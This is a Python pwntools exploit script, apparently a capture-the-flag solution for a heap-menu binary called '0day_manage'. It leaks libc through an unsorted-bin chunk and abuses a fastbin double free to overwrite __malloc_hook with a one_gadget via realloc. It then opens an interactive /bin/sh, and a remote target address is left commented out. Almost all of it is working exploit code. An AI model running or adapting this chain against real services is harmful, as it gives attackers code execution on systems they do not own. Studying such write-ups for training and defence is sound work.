#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    typedef struct Link{
        struct Link *next;
        void *ptr;
    }Link;
    Link *no_use1;

    typedef struct Node{
        int type;
        int data_size;
        char *data;
        int note_size;
        int field_14;
        char *note;
        int shellcode_size;
        int field_24;
        char *shellcode;
    }Node;
    Node *no_use2;

    typedef struct leak{
        int type;
        int data_size;
        char *data;
        int note_size;
        int field_14;
        char *note;
        char offset[8];
    }leak;
    leak *no_use3;

    typedef struct Memory{
        int type;
        int data_size;
        char *data;
        int note_size;
        int field_14;
        char *note;
        int shellcode_size;
        int field_24;
        char *shellcode;
    }Memory;
    Memory *no_use4;

    typedef struct Logic{
        int type;
        int data_size;
        char *data;
        int note_size;
        int field_14;
        char *note;
        void *field_20;
        void *field_28;
    }Logic;
    Logic *no_use5;

    typedef struct Container{
        void *array[6];
    }Container;
    Container *no_use6;

    typedef struct Control{
        int field_0;
        int field_4;
        Container *con;
    }Control;
    Control *no_use7;

    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './0day_manage'
sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
# sh = remote('47.112.137.133', 12345)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $p = *(Control **)$rebase(0x203050)

    define pr
        p *$p->con
        end

    define prl
        set $t= (Link *)(*$p->con).array[0]
        p *$t
        p *(leak *)$t->ptr
        end

    define prm
        set $t= (Link *)(*$p->con).array[1]
        p *$t
        p *(Memory *)$t->ptr
        end

    define prlo
        set $t= (Link *)(*$p->con).array[2]
        p *$t
        p *(Logic *)$t->ptr
        end
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)


def _sendline(str):
    sh.sendline(str)
    # time.sleep(0.5)

_sendline('1')
_sendline('3')
_sendline(str(0x58))
_sendline('1')
_sendline(str(0x418)) # unsorted bin
_sendline('1')
_sendline('4')
_sendline('3')
_sendline('0')

# show
_sendline('2')
_sendline('3')
sh.recvuntil('note :')
sh.recvuntil('note :')
result = sh.recvn(8)
main_arena_addr = u64(result) - 96
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))

_sendline('1')
_sendline('2')
_sendline(str(0x68))
_sendline('1')
_sendline(str(0x68))
_sendline('1')
_sendline(str(0x68))
_sendline('1')

_sendline('4')
_sendline('2')
_sendline('0')

_sendline('4')
_sendline('2')
_sendline('0')

_sendline('4')
_sendline('2')
_sendline('0')

_sendline('4')
_sendline('2')
_sendline('0')


_sendline('1')
_sendline('2')
_sendline(str(0x68))
_sendline(p64(main_arena_addr - 0x33))
_sendline(str(0x68))
_sendline('1')
_sendline(str(0x68))
_sendline('1')

_sendline('1')
_sendline('2')
_sendline(str(0x68))
_sendline('1')
_sendline(str(0x68))
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
# pause()

_sendline('z' * 11 + p64(libc_addr + 0x4f2c5) + p64(libc_addr + libc.symbols['realloc'] + 2))
_sendline(str(0x68))

sh.interactive()
clear()